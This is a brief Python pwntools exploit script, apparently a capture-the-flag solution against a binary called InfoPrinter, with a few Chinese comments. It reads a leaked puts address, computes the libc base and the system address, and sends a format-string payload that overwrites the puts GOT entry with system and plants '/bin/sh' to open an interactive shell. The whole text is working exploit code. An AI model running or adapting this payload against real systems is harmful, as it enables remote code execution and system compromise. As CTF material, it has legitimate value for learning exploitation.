from pwn import *

context.binary = './InfoPrinter'

r = remote(...)
elf = context.binary
#or elf = ELF('./InfoPrinter')
libc = ELF('./libc-2.31.so')

r.recvuntil(b"Here is a key ")
puts = int(r.recv().split()[0],16)
#删去多余的空格，转换为int

libcbase = puts - libc.sym['puts']
system = libcbase + libc.sym['system']
#地址计算

puts_got = elf.got['puts']

xx = 0x403878

payload = fmtstr_payload(6,{puts_got:system, xx:b'/bin/sh\x00'})
#offset=6
r.sendline(payload)
r.interactive()
